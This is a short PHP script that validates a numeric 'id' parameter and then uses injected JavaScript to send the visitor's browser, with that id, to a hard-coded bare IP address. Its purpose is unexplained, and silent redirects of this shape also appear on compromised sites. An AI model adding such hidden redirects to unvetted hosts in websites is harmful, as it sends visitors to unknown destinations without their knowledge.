<?php

$id = $_GET["id"];

if(!is_numeric($id)) die();


echo "<script>window.location = 'http://85.17.73.196/?id=$id'</script>";

die();

?>